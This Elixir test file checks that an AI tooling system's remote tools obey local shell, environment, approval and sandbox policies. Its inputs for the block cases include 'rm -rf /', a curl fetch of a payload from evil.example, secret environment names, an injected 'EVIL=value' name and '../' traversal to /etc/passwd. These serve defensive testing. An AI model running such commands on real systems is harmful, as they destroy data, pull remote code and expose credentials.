defmodule Tet.Remote.PolicyParityPoliciesTest do
  @moduledoc """
  BD-0056: Policy parity policy tests — shell, env, approval, sandbox.

  Verifies that remote tools obey the same shell/env/approval/sandbox
  policies as local tools. Remote cannot bypass local policies.
  """

  use ExUnit.Case, async: true

  alias Tet.Remote.{EnvPolicy, PolicyParity}
  alias Tet.ShellPolicy
  alias Tet.Tool.Contract

  # ---------------------------------------------------------------------------
  # Helpers
  # ---------------------------------------------------------------------------

  defp local_read_contract do
    {:ok, contract} = Tet.Tool.ReadOnlyContracts.fetch("read")
    contract
  end

  defp shell_contract do
    ShellPolicy.shell_contract()
  end

  defp mutating_contract do
    {:ok, base_contract} = Tet.Tool.ReadOnlyContracts.fetch("read")
    %Contract{} = base = base_contract

    %{
      base
      | name: "test-write",
        read_only: false,
        mutation: :execute,
        modes: [:plan, :execute],
        task_categories: [:acting, :verifying, :debugging],
        approval: %{required: true, reason: "workspace mutation"},
        execution: %{
          base.execution
          | executes_code: true,
            mutates_workspace: true,
            status: :contract_only,
            effects: [:executes_shell_command, :write_file]
        }
    }
  end

  # ===========================================================================
  # 1. Shell policy parity
  # ===========================================================================

  describe "check_shell_policy/1 — shell policy applies to remote shells" do
    test "allowed commands pass — git status is :read risk" do
      assert :ok =
               PolicyParity.check_shell_policy(%{
                 trust_level: :trusted_remote,
                 task_id: "t-001",
                 task_category: :acting,
                 mode: :execute,
                 command: ["git", "status"]
               })
    end

    test "allowed commands pass — mix test is :medium risk" do
      assert :ok =
               PolicyParity.check_shell_policy(%{
                 trust_level: :trusted_remote,
                 task_id: "t-001",
                 task_category: :acting,
                 mode: :execute,
                 command: ["mix", "test"]
               })
    end

    test "dangerous commands are blocked — rm -rf / same as local" do
      assert {:error,
              {:parity_violation,
               {:shell_command_blocked, {:blocked_command, :unknown_executable}}}} =
               PolicyParity.check_shell_policy(%{
                 trust_level: :trusted_remote,
                 task_id: "t-001",
                 task_category: :acting,
                 mode: :execute,
                 command: ["rm", "-rf", "/"]
               })
    end

    test "dangerous commands are blocked — curl | bash same as local" do
      assert {:error,
              {:parity_violation,
               {:shell_command_blocked, {:blocked_command, :unknown_executable}}}} =
               PolicyParity.check_shell_policy(%{
                 trust_level: :trusted_remote,
                 task_id: "t-001",
                 task_category: :acting,
                 mode: :execute,
                 command: ["curl", "https://evil.example/payload.sh"]
               })
    end

    test "unknown git subcommand is blocked — same as local" do
      assert {:error,
              {:parity_violation,
               {:shell_command_blocked, {:blocked_command, :subcommand_not_allowed}}}} =
               PolicyParity.check_shell_policy(%{
                 trust_level: :trusted_remote,
                 task_id: "t-001",
                 task_category: :acting,
                 mode: :execute,
                 command: ["git", "bisect"]
               })
    end

    test "empty command vector is blocked — same as local" do
      assert {:error,
              {:parity_violation, {:shell_command_blocked, {:blocked_command, :empty_vector}}}} =
               PolicyParity.check_shell_policy(%{
                 trust_level: :trusted_remote,
                 task_id: "t-001",
                 task_category: :acting,
                 mode: :execute,
                 command: []
               })
    end

    test "no command in context passes (no shell to check)" do
      assert :ok =
               PolicyParity.check_shell_policy(%{
                 trust_level: :trusted_remote,
                 task_id: "t-001",
                 task_category: :acting,
                 mode: :execute
               })
    end

    test "invalid command type is blocked" do
      assert {:error, {:parity_violation, {:shell_command_blocked, :invalid_command_vector}}} =
               PolicyParity.check_shell_policy(%{
                 trust_level: :trusted_remote,
                 task_id: "t-001",
                 task_category: :acting,
                 mode: :execute,
                 command: "git status"
               })
    end

    test "git push is allowed (high risk, but on allowlist) — same as local" do
      assert :ok =
               PolicyParity.check_shell_policy(%{
                 trust_level: :trusted_remote,
                 task_id: "t-001",
                 task_category: :acting,
                 mode: :execute,
                 command: ["git", "push"]
               })
    end

    test "trust level does not bypass shell policy — local also blocked for rm" do
      assert {:error,
              {:parity_violation,
               {:shell_command_blocked, {:blocked_command, :unknown_executable}}}} =
               PolicyParity.check_shell_policy(%{
                 trust_level: :local,
                 task_id: "t-001",
                 task_category: :acting,
                 mode: :execute,
                 command: ["rm", "-rf", "/"]
               })
    end
  end

  describe "cross-cutting: shell policy identical for local and remote" do
    test "ShellPolicy blocks rm — parity also blocks rm regardless of trust" do
      for trust <- [:local, :trusted_remote, :untrusted_remote] do
        assert {:error, _} = ShellPolicy.check_command(["rm", "-rf", "/"])

        assert {:error, {:parity_violation, {:shell_command_blocked, _}}} =
                 PolicyParity.check_shell_policy(%{
                   trust_level: trust,
                   task_id: "t-001",
                   task_category: :acting,
                   mode: :execute,
                   command: ["rm", "-rf", "/"]
                 })
      end
    end
  end

  # ===========================================================================
  # 2. Env policy parity
  # ===========================================================================

  describe "check_env_policy/1 — remote env policy filters apply" do
    test "valid allowlist passes" do
      assert :ok =
               PolicyParity.check_env_policy(%{
                 trust_level: :trusted_remote,
                 task_id: "t-001",
                 task_category: :acting,
                 mode: :execute,
                 env_allowlist: ["PATH", "HOME"],
                 env_map: %{"PATH" => "/usr/bin", "HOME" => "/home/user"}
               })
    end

    test "secret-carrying env name on allowlist is rejected — same as local" do
      assert {:error,
              {:parity_violation, {:env_policy_denied, {:secret_name, "AWS_SECRET_ACCESS_KEY"}}}} =
               PolicyParity.check_env_policy(%{
                 trust_level: :trusted_remote,
                 task_id: "t-001",
                 task_category: :acting,
                 mode: :execute,
                 env_allowlist: ["PATH", "AWS_SECRET_ACCESS_KEY"],
                 env_map: %{}
               })
    end

    test "DATABASE_URL on allowlist is rejected — same as local" do
      assert {:error, {:parity_violation, {:env_policy_denied, {:secret_name, "DATABASE_URL"}}}} =
               PolicyParity.check_env_policy(%{
                 trust_level: :trusted_remote,
                 task_id: "t-001",
                 task_category: :acting,
                 mode: :execute,
                 env_allowlist: ["DATABASE_URL"],
                 env_map: %{}
               })
    end

    test "API_KEY on allowlist is rejected — same as local" do
      assert {:error, {:parity_violation, {:env_policy_denied, {:secret_name, "API_KEY"}}}} =
               PolicyParity.check_env_policy(%{
                 trust_level: :trusted_remote,
                 task_id: "t-001",
                 task_category: :acting,
                 mode: :execute,
                 env_allowlist: ["API_KEY"],
                 env_map: %{}
               })
    end

    test "name with equals sign is rejected (injection) — same as local" do
      assert {:error,
              {:parity_violation,
               {:env_policy_denied,
                {:invalid_env_allowlist, {:name_contains_equals, "EVIL=value"}}}}} =
               PolicyParity.check_env_policy(%{
                 trust_level: :trusted_remote,
                 task_id: "t-001",
                 task_category: :acting,
                 mode: :execute,
                 env_allowlist: ["EVIL=value"],
                 env_map: %{}
               })
    end

    test "empty allowlist passes (default deny)" do
      assert :ok =
               PolicyParity.check_env_policy(%{
                 trust_level: :trusted_remote,
                 task_id: "t-001",
                 task_category: :acting,
                 mode: :execute,
                 env_allowlist: [],
                 env_map: %{}
               })
    end

    test "no allowlist in context passes (no env to check)" do
      assert :ok =
               PolicyParity.check_env_policy(%{
                 trust_level: :trusted_remote,
                 task_id: "t-001",
                 task_category: :acting,
                 mode: :execute
               })
    end

    test "trust level does not widen env policy — local also rejects secrets" do
      assert {:error,
              {:parity_violation, {:env_policy_denied, {:secret_name, "AWS_SECRET_ACCESS_KEY"}}}} =
               PolicyParity.check_env_policy(%{
                 trust_level: :local,
                 task_id: "t-001",
                 task_category: :acting,
                 mode: :execute,
                 env_allowlist: ["AWS_SECRET_ACCESS_KEY"],
                 env_map: %{}
               })
    end
  end

  describe "check_env_policy/1 — env_map default-deny enforcement" do
    test "env_map present but env_allowlist nil fails closed" do
      assert {:error, {:parity_violation, {:env_policy_denied, :env_map_without_allowlist}}} =
               PolicyParity.check_env_policy(%{
                 trust_level: :trusted_remote,
                 task_id: "t-001",
                 task_category: :acting,
                 mode: :execute,
                 env_map: %{"PATH" => "/usr/bin", "SECRET" => "s3cret"}
               })
    end

    test "env_map with keys outside allowlist is rejected" do
      assert {:error,
              {:parity_violation, {:env_policy_denied, {:keys_outside_allowlist, ["SECRET"]}}}} =
               PolicyParity.check_env_policy(%{
                 trust_level: :trusted_remote,
                 task_id: "t-001",
                 task_category: :acting,
                 mode: :execute,
                 env_allowlist: ["PATH", "HOME"],
                 env_map: %{"PATH" => "/usr/bin", "SECRET" => "s3cret"}
               })
    end

    test "env_map with all keys within allowlist passes" do
      assert :ok =
               PolicyParity.check_env_policy(%{
                 trust_level: :trusted_remote,
                 task_id: "t-001",
                 task_category: :acting,
                 mode: :execute,
                 env_allowlist: ["PATH", "HOME"],
                 env_map: %{"PATH" => "/usr/bin", "HOME" => "/home/user"}
               })
    end

    test "empty env_map with nil allowlist passes" do
      assert :ok =
               PolicyParity.check_env_policy(%{
                 trust_level: :trusted_remote,
                 task_id: "t-001",
                 task_category: :acting,
                 mode: :execute,
                 env_map: %{}
               })
    end
  end

  describe "cross-cutting: env policy identical for local and remote" do
    test "EnvPolicy rejects secrets — parity also rejects secrets regardless of trust" do
      for trust <- [:local, :trusted_remote] do
        assert {:error, _} = EnvPolicy.validate_allowlist(["AWS_SECRET_ACCESS_KEY"])

        assert {:error, {:parity_violation, {:env_policy_denied, _}}} =
                 PolicyParity.check_env_policy(%{
                   trust_level: trust,
                   task_id: "t-001",
                   task_category: :acting,
                   mode: :execute,
                   env_allowlist: ["AWS_SECRET_ACCESS_KEY"],
                   env_map: %{}
                 })
      end
    end
  end

  # ===========================================================================
  # 3. Approval parity
  # ===========================================================================

  describe "check_approval_parity/1 — mutating operations require approval" do
    test "mutating contract with :approved passes" do
      assert :ok =
               PolicyParity.check_approval_parity(%{
                 trust_level: :trusted_remote,
                 task_id: "t-001",
                 task_category: :acting,
                 mode: :execute,
                 contract: mutating_contract(),
                 approval_status: :approved
               })
    end

    test "mutating contract with :pending is blocked" do
      assert {:error,
              {:parity_violation,
               {:approval_required_for_mutation,
                %{contract: "test-write", approval_status: :pending}}}} =
               PolicyParity.check_approval_parity(%{
                 trust_level: :trusted_remote,
                 task_id: "t-001",
                 task_category: :acting,
                 mode: :execute,
                 contract: mutating_contract(),
                 approval_status: :pending
               })
    end

    test "mutating contract with :rejected is blocked" do
      assert {:error,
              {:parity_violation,
               {:approval_required_for_mutation,
                %{contract: "test-write", approval_status: :rejected}}}} =
               PolicyParity.check_approval_parity(%{
                 trust_level: :trusted_remote,
                 task_id: "t-001",
                 task_category: :acting,
                 mode: :execute,
                 contract: mutating_contract(),
                 approval_status: :rejected
               })
    end

    test "mutating contract with :unknown is blocked" do
      assert {:error,
              {:parity_violation,
               {:approval_required_for_mutation,
                %{contract: "test-write", approval_status: :unknown}}}} =
               PolicyParity.check_approval_parity(%{
                 trust_level: :trusted_remote,
                 task_id: "t-001",
                 task_category: :acting,
                 mode: :execute,
                 contract: mutating_contract(),
                 approval_status: :unknown
               })
    end

    test "mutating contract without approval_status defaults to nil (blocked)" do
      assert {:error,
              {:parity_violation,
               {:approval_required_for_mutation, %{contract: "test-write", approval_status: nil}}}} =
               PolicyParity.check_approval_parity(%{
                 trust_level: :trusted_remote,
                 task_id: "t-001",
                 task_category: :acting,
                 mode: :execute,
                 contract: mutating_contract()
               })
    end

    test "read-only contract passes regardless of approval_status" do
      assert :ok =
               PolicyParity.check_approval_parity(%{
                 trust_level: :trusted_remote,
                 task_id: "t-001",
                 task_category: :acting,
                 mode: :execute,
                 contract: local_read_contract(),
                 approval_status: nil
               })
    end

    test "high-risk command without approval is blocked" do
      assert {:error,
              {:parity_violation,
               {:approval_required_for_mutation,
                %{command: ["git", "push"], approval_status: nil}}}} =
               PolicyParity.check_approval_parity(%{
                 trust_level: :trusted_remote,
                 task_id: "t-001",
                 task_category: :acting,
                 mode: :execute,
                 command: ["git", "push"]
               })
    end

    test "high-risk command with :approved passes" do
      assert :ok =
               PolicyParity.check_approval_parity(%{
                 trust_level: :trusted_remote,
                 task_id: "t-001",
                 task_category: :acting,
                 mode: :execute,
                 command: ["git", "push"],
                 approval_status: :approved
               })
    end

    test "read-risk command does not require approval — same as local" do
      assert :ok =
               PolicyParity.check_approval_parity(%{
                 trust_level: :trusted_remote,
                 task_id: "t-001",
                 task_category: :acting,
                 mode: :execute,
                 command: ["git", "status"]
               })
    end

    test "low-risk mutating command requires approval — git add" do
      assert {:error,
              {:parity_violation,
               {:approval_required_for_mutation, %{command: ["git", "add"], approval_status: nil}}}} =
               PolicyParity.check_approval_parity(%{
                 trust_level: :trusted_remote,
                 task_id: "t-001",
                 task_category: :acting,
                 mode: :execute,
                 command: ["git", "add"]
               })
    end

    test "low-risk mutating command with :approved passes — mix format" do
      assert :ok =
               PolicyParity.check_approval_parity(%{
                 trust_level: :trusted_remote,
                 task_id: "t-001",
                 task_category: :acting,
                 mode: :execute,
                 command: ["mix", "format"],
                 approval_status: :approved
               })
    end

    test "mutating operation requires approval even without contract" do
      assert {:error,
              {:parity_violation,
               {:approval_required_for_mutation,
                %{operation: :write_scoped_files, approval_status: nil}}}} =
               PolicyParity.check_approval_parity(%{
                 trust_level: :trusted_remote,
                 task_id: "t-001",
                 task_category: :acting,
                 mode: :execute,
                 operation: :write_scoped_files
               })
    end

    test "mutating operation with :approved passes" do
      assert :ok =
               PolicyParity.check_approval_parity(%{
                 trust_level: :trusted_remote,
                 task_id: "t-001",
                 task_category: :acting,
                 mode: :execute,
                 operation: :write_scoped_files,
                 approval_status: :approved
               })
    end

    test "read operation does not require approval" do
      assert :ok =
               PolicyParity.check_approval_parity(%{
                 trust_level: :trusted_remote,
                 task_id: "t-001",
                 task_category: :acting,
                 mode: :execute,
                 operation: :read_files
               })
    end

    test "shell contract is mutating — requires approval" do
      assert {:error,
              {:parity_violation,
               {:approval_required_for_mutation,
                %{contract: "shell-policy", approval_status: nil}}}} =
               PolicyParity.check_approval_parity(%{
                 trust_level: :trusted_remote,
                 task_id: "t-001",
                 task_category: :acting,
                 mode: :execute,
                 contract: shell_contract()
               })
    end
  end

  describe "check_approval_parity/1 — read-only contract cannot override mutating command/operation (BD-0056 #2)" do
    test "command + read-only contract + no approval is BLOCKED" do
      # A read-only contract must NOT override a mutating command.
      # Previously, read-only contract short-circuited to :ok even when
      # a mutating command was also present.
      assert {:error,
              {:parity_violation,
               {:approval_required_for_mutation, %{command: ["git", "add"], approval_status: nil}}}} =
               PolicyParity.check_approval_parity(%{
                 trust_level: :trusted_remote,
                 task_id: "t-001",
                 task_category: :acting,
                 mode: :execute,
                 command: ["git", "add"],
                 contract: local_read_contract()
               })
    end

    test "git add + read-only contract + no approval is BLOCKED" do
      # Explicit regression: git add is a low-risk mutating command.
      # Attaching a read-only contract must not bypass approval.
      assert {:error,
              {:parity_violation,
               {:approval_required_for_mutation, %{command: ["git", "add"], approval_status: nil}}}} =
               PolicyParity.check_approval_parity(%{
                 trust_level: :trusted_remote,
                 task_id: "t-001",
                 task_category: :acting,
                 mode: :execute,
                 command: ["git", "add"],
                 contract: local_read_contract(),
                 approval_status: nil
               })
    end

    test "command + read-only contract + :approved passes" do
      # With approval, mutating command + read-only contract should pass.
      assert :ok =
               PolicyParity.check_approval_parity(%{
                 trust_level: :trusted_remote,
                 task_id: "t-001",
                 task_category: :acting,
                 mode: :execute,
                 command: ["git", "add"],
                 contract: local_read_contract(),
                 approval_status: :approved
               })
    end

    test "mutating operation + read-only contract + no approval is BLOCKED" do
      # A mutating operation alongside a read-only contract still needs approval.
      assert {:error,
              {:parity_violation,
               {:approval_required_for_mutation,
                %{operation: :write_scoped_files, approval_status: nil}}}} =
               PolicyParity.check_approval_parity(%{
                 trust_level: :trusted_remote,
                 task_id: "t-001",
                 task_category: :acting,
                 mode: :execute,
                 operation: :write_scoped_files,
                 contract: local_read_contract()
               })
    end

    test "read-only command + read-only contract passes without approval" do
      # git status is :read risk — no approval needed.
      assert :ok =
               PolicyParity.check_approval_parity(%{
                 trust_level: :trusted_remote,
                 task_id: "t-001",
                 task_category: :acting,
                 mode: :execute,
                 command: ["git", "status"],
                 contract: local_read_contract()
               })
    end

    test "read-only contract alone passes (no command, no operation)" do
      # Pure read-only contract without any mutating signals — no approval needed.
      assert :ok =
               PolicyParity.check_approval_parity(%{
                 trust_level: :trusted_remote,
                 task_id: "t-001",
                 task_category: :acting,
                 mode: :execute,
                 contract: local_read_contract()
               })
    end
  end

  # ===========================================================================
  # 4. Sandbox parity
  # ===========================================================================
  describe "check_sandbox_parity/1 — sandbox restrictions apply to remote" do
    test "cwd within workspace_root passes" do
      assert :ok =
               PolicyParity.check_sandbox_parity(%{
                 trust_level: :trusted_remote,
                 task_id: "t-001",
                 task_category: :acting,
                 mode: :execute,
                 cwd: "/workspace/project/src",
                 workspace_root: "/workspace/project"
               })
    end

    test "cwd outside workspace_root is blocked" do
      assert {:error, {:parity_violation, {:sandbox_violation, :cwd_outside_workspace}}} =
               PolicyParity.check_sandbox_parity(%{
                 trust_level: :trusted_remote,
                 task_id: "t-001",
                 task_category: :acting,
                 mode: :execute,
                 cwd: "/etc/passwd",
                 workspace_root: "/workspace/project"
               })
    end

    test "path traversal with ../ is blocked" do
      assert {:error, {:parity_violation, {:sandbox_violation, :path_traversal_detected}}} =
               PolicyParity.check_sandbox_parity(%{
                 trust_level: :trusted_remote,
                 task_id: "t-001",
                 task_category: :acting,
                 mode: :execute,
                 cwd: "/workspace/project/../../../etc/passwd",
                 workspace_root: "/workspace/project"
               })
    end

    test "missing cwd fails closed" do
      assert {:error, {:parity_violation, {:sandbox_violation, :missing_cwd}}} =
               PolicyParity.check_sandbox_parity(%{
                 trust_level: :trusted_remote,
                 task_id: "t-001",
                 task_category: :acting,
                 mode: :execute,
                 cwd: nil,
                 workspace_root: "/workspace/project"
               })
    end

    test "missing workspace_root fails closed" do
      assert {:error, {:parity_violation, {:sandbox_violation, :missing_workspace_root}}} =
               PolicyParity.check_sandbox_parity(%{
                 trust_level: :trusted_remote,
                 task_id: "t-001",
                 task_category: :acting,
                 mode: :execute,
                 cwd: "/workspace/project/src",
                 workspace_root: nil
               })
    end

    test "no sandbox fields and no path operation passes" do
      assert :ok =
               PolicyParity.check_sandbox_parity(%{
                 trust_level: :trusted_remote,
                 task_id: "t-001",
                 task_category: :acting,
                 mode: :execute
               })
    end

    test "mutating contract requires sandbox fields" do
      assert {:error, {:parity_violation, {:sandbox_violation, :missing_cwd}}} =
               PolicyParity.check_sandbox_parity(%{
                 trust_level: :trusted_remote,
                 task_id: "t-001",
                 task_category: :acting,
                 mode: :execute,
                 contract: mutating_contract()
               })
    end

    test "exact workspace_root as cwd passes" do
      assert :ok =
               PolicyParity.check_sandbox_parity(%{
                 trust_level: :trusted_remote,
                 task_id: "t-001",
                 task_category: :acting,
                 mode: :execute,
                 cwd: "/workspace/project",
                 workspace_root: "/workspace/project"
               })
    end

    test "sibling path does not bypass sandbox — project_evil ≠ project" do
      assert {:error, {:parity_violation, {:sandbox_violation, :cwd_outside_workspace}}} =
               PolicyParity.check_sandbox_parity(%{
                 trust_level: :trusted_remote,
                 task_id: "t-001",
                 task_category: :acting,
                 mode: :execute,
                 cwd: "/workspace/project_evil",
                 workspace_root: "/workspace/project"
               })
    end

    test "sibling path does not bypass sandbox — project2 ≠ project" do
      assert {:error, {:parity_violation, {:sandbox_violation, :cwd_outside_workspace}}} =
               PolicyParity.check_sandbox_parity(%{
                 trust_level: :trusted_remote,
                 task_id: "t-001",
                 task_category: :acting,
                 mode: :execute,
                 cwd: "/workspace/project2",
                 workspace_root: "/workspace/project"
               })
    end

    test "shell command requires sandbox fields even without cwd/workspace_root" do
      assert {:error, {:parity_violation, {:sandbox_violation, :missing_cwd}}} =
               PolicyParity.check_sandbox_parity(%{
                 trust_level: :trusted_remote,
                 task_id: "t-001",
                 task_category: :acting,
                 mode: :execute,
                 command: ["git", "status"]
               })
    end

    test "shell command with sandbox fields passes" do
      assert :ok =
               PolicyParity.check_sandbox_parity(%{
                 trust_level: :trusted_remote,
                 task_id: "t-001",
                 task_category: :acting,
                 mode: :execute,
                 command: ["git", "status"],
                 cwd: "/workspace/project",
                 workspace_root: "/workspace/project"
               })
    end

    test "operation requiring sandbox requires sandbox fields" do
      assert {:error, {:parity_violation, {:sandbox_violation, :missing_cwd}}} =
               PolicyParity.check_sandbox_parity(%{
                 trust_level: :trusted_remote,
                 task_id: "t-001",
                 task_category: :acting,
                 mode: :execute,
                 operation: :write_scoped_files
               })
    end

    test "read operation does not require sandbox fields" do
      assert :ok =
               PolicyParity.check_sandbox_parity(%{
                 trust_level: :trusted_remote,
                 task_id: "t-001",
                 task_category: :acting,
                 mode: :execute,
                 operation: :read_status
               })
    end
  end
end
